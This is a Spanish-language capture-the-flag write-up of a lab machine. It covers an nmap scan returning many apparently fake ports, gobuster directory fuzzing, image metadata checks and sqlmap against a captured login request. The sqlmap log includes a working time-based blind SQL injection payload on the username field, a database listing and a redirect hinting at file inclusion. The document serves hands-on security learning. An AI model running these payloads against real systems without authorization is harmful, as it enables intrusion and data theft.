## Step 1 — Reconnaissance


realize un escaneo con :
```bash
nmap -sV 10.66.168.77
```
raramente se muestran todos los pueetos abiertos

1217/tcp  open  tcpmux
1218/tcp  open  http                 Henry httpd 350044 (NEC Aspire WebPro http config)
1233/tcp  open  univ-appserver?
1234/tcp  open  hotline?
1236/tcp  open  oracle-vs            Oracle Virtual Service Agent (Xen)
1244/tcp  open  isbconference1?
1247/tcp  open  telnet               HP Integrated Lights Out telnetd
1248/tcp  open  http                 Microsoft ISA httpd
1259/tcp  open  opennl-voice?
1271/tcp  open  http                 Asus RT-xWathcJ WAP http config
1272/tcp  open  telnet               Fujian SVG6000R VoIP gateway telnetd
1277/tcp  open  ftp
1287/tcp  open  rtsp                 D-Link DCS-2130 or Pelco IDE10DN webcam rtspd
1296/tcp  open  http                 SMC Barricade router http config
1300/tcp  open  h323hostcallsc?
1301/tcp  open  ci3-software-1?
1309/tcp  open  ftp                  AXIS FX print server ftpd 3QTvB
1310/tcp  open  http                 Teradici PCoIP remote management http config
1311/tcp  open  rxmon?
1322/tcp  open  telnet               Epson 5.. print server telnetd
1328/tcp  open  http                 ZoneAlarm Z100G firewall http config
1334/tcp  open  writesrv?
1352/tcp  open  smtp-proxy           Tumbleweed Email Firewall smtp proxy
1417/tcp  open  http                 Cisco ASA AWARE http config xT
1433/tcp  open  smtp-proxy           MailFoundry antispam smtp proxy
1434/tcp  open  ftp                  Toshiba CTX PBX ftpd
1443/tcp  open  ms-sql-s             Microsoft SQL Server 2005 9.00.4211; SP3+
1455/tcp  open  http                 Norman Security Endpoint Protection httpd 1615819
1461/tcp  open  ibm_wrless_lan?
1494/tcp  open  http                 Chumby chumbhttpd
1500/tcp  open  smtp                 MasqMail smtpd 2shH
1501/tcp  open  sas-3?
1503/tcp  open  imtc-mcs?
1521/tcp  open  http                 HP Apache-based httpd
1524/tcp  open  ingreslock?


entre muchos mas, me parece un cooomportamiento extraño, tal vez un honeypot o un firewall ocultando los puertos realmente abiertos, de todas formas entrare al puerto mas comun, http, tiene varios servicox abiertos, mi sospecha de que son puertos falsos es que hay puertos que realmente no tienen mucho sentido, incluso hay un servidor de minecraft corriendo en un puerto http :

49175/tcp open  http                 Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older


en fin, al entrar con la direccion ip de la maquina la sitio puedo ver una tienda, con el nombre del ctf, tal vez ese sea mi punto de entrada para ver lo que realmente necesito y no perder el tiempo con los puertos "flasos"


hare fuzzing a la pagina web

```bash
gobuster dir -u 10.66.168.77 -w big.txt
```
luego de un fuzzing solo encontre una ruta de images 

.htaccess            (Status: 403) [Size: 277]
.htpasswd            (Status: 403) [Size: 277]
images               (Status: 301) [Size: 313] [--> http://10.66.168.77/images/]
server-status        (Status: 403) [Size: 277]


hare fuzzing sobre images 

.htaccess            (Status: 403) [Size: 277]
.htpasswd            (Status: 403) [Size: 277]

no obtuve nada, vere si las imagenes contienen algun mensaje en los metadatos o algun tipo de informacion. 


[davidoberst@archlinux tmp]$ exiftool cheese2.jpg
ExifTool Version Number         : 13.55
File Name                       : cheese2.jpg
Directory                       : .
File Size                       : 23 kB
File Modification Date/Time     : 2023:09:09 22:34:35-05:00
File Access Date/Time           : 2026:06:20 23:24:26-05:00
File Inode Change Date/Time     : 2026:06:20 23:24:26-05:00
File Permissions                : -rw-r--r--
File Type                       : Extended WEBP
File Type Extension             : webp
MIME Type                       : image/webp
WebP Flags                      : EXIF, ICC Profile
Image Width                     : 512
Image Height                    : 341
Profile CMM Type                : Little CMS
Profile Version                 : 2.1.0
Profile Class                   : Display Device Profile
Color Space Data                : RGB
Profile Connection Space        : XYZ
Profile Date Time               : 2012:01:25 03:41:57
Profile File Signature          : acsp
Primary Platform                : Apple Computer Inc.
CMM Flags                       : Not Embedded, Independent
Device Manufacturer             : 
Device Model                    : 
Device Attributes               : Reflective, Glossy, Positive, Color
Rendering Intent                : Perceptual
Connection Space Illuminant     : 0.9642 1 0.82491
Profile Creator                 : Little CMS
Profile ID                      : 0
Profile Description             : c2ci
Profile Copyright               : CC0
Media White Point               : 0.9642 1 0.82491
Red Matrix Column               : 0.43607 0.22249 0.01392
Green Matrix Column             : 0.38515 0.71687 0.09708
Blue Matrix Column              : 0.14307 0.06061 0.7141
Red Tone Reproduction Curve     : (Binary data 64 bytes, use -b option to extract)
Green Tone Reproduction Curve   : (Binary data 64 bytes, use -b option to extract)
Blue Tone Reproduction Curve    : (Binary data 64 bytes, use -b option to extract)
VP8 Version                     : 0 (bicubic reconstruction, normal loop)
Horizontal Scale                : 0
Vertical Scale                  : 0
Warning                         : [minor] Improper EXIF header
Exif Byte Order                 : Little-endian (Intel, II)
Orientation                     : Horizontal (normal)
X Resolution                    : 72
Y Resolution                    : 72
Resolution Unit                 : inches
Y Cb Cr Positioning             : Centered
Exif Version                    : 0210
Components Configuration        : Y, Cb, Cr, -
Flashpix Version                : 0100
Color Space                     : Uncalibrated
Exif Image Width                : 512
Exif Image Height               : 341
Image Size                      : 512x341
Megapixels                      : 0.175


la imagen 2 esta corrupta y el resto de imagenes fueron ca,biadas de extension, en otra ocasion reparare la imagen dos para poder ver su contenido y vere si tiene mensajes o informacion oculta, por ahora me concentrare en el login, 


luego de loguearme, tengo la peticion web : 

POST /login.php HTTP/1.1
Host: 10.66.168.77
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:152.0) Gecko/20100101 Firefox/152.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 27
Origin: http://10.66.168.77
Connection: keep-alive
Referer: http://10.66.168.77/login.php
Upgrade-Insecure-Requests: 1
Priority: u=0, i

username=user&password=pass

la descatrgare y la pasare por sqlmap para revisar si es vulnerable a una inyeccion sql


sqlmap -r t.txt -p username,password --batch --dbs


       __H__
 ___ ___[.]_____ ___ ___  {1.10.6#stable}
|_ -| . [.]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 00:19:40 /2026-06-21/

[00:19:40] [INFO] parsing HTTP request from 't.txt'
[00:19:40] [INFO] testing connection to the target URL
[00:19:40] [INFO] checking if the target is protected by some kind of WAF/IPS
[00:19:40] [INFO] testing if the target URL content is stable
[00:19:41] [INFO] target URL content is stable
[00:19:41] [WARNING] heuristic (basic) test shows that POST parameter 'username' might not be injectable
[00:19:41] [INFO] testing for SQL injection on POST parameter 'username'
[00:19:41] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[00:19:41] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[00:19:41] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[00:19:42] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[00:19:42] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[00:19:42] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[00:19:43] [INFO] testing 'Generic inline queries'
[00:19:43] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[00:19:43] [WARNING] time-based comparison requires larger statistical model, please wait. (done)            
[00:19:43] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[00:19:44] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[00:19:44] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[00:19:54] [INFO] POST parameter 'username' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[00:19:54] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[00:19:54] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
got a 302 redirect to 'http://10.66.168.77/secret-script.php?file=supersecretadminpanel.html'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [y/N] N
[00:19:56] [INFO] target URL appears to be UNION injectable with 3 columns
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
[00:19:59] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql') 
[00:19:59] [INFO] checking if the injection point on POST parameter 'username' is a false positive
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 97 HTTP(s) requests:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=user' AND (SELECT 3177 FROM (SELECT(SLEEP(5)))WLBY) AND 'QzeF'='QzeF&password=pass
---
[00:20:15] [INFO] the back-end DBMS is MySQL
[00:20:15] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
web server operating system: Linux Ubuntu 20.10 or 19.10 or 20.04 (focal or eoan)
web application technology: Apache 2.4.41
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[00:20:20] [INFO] fetching database names
[00:20:20] [INFO] fetching number of databases
[00:20:20] [INFO] retrieved: 
[00:20:30] [INFO] adjusting time delay to 1 second due to good response times
2
[00:20:31] [INFO] retrieved: information_schema
[00:21:37] [INFO] retrieved: users
available databases [2]:
[*] information_schema
[*] users

[00:21:55] [INFO] fetched data logged to text files under '/home/davidoberst/.local/share/sqlmap/output/10.66.168.77'


Confirmó que el parámetro username es vulnerable a Time-based blind (basado en tiempo con SLEEP). Tardó 10 segundos en reaccionar ahí (00:19:44 a 00:19:54) porque el servidor se quedó dormido tal como sqlmap le ordenó.

el servidor intentó redirigirte (HTTP 302) a /secret-script.php?file=supersecretadminpanel.html. Le dijiste que sí la siguiera, pero le dijiste que No (N) reenviara los datos POST al nuevo sitio, lo cual fue la decisión correcta para que sqlmap siguiera concentrado en el formulario de login.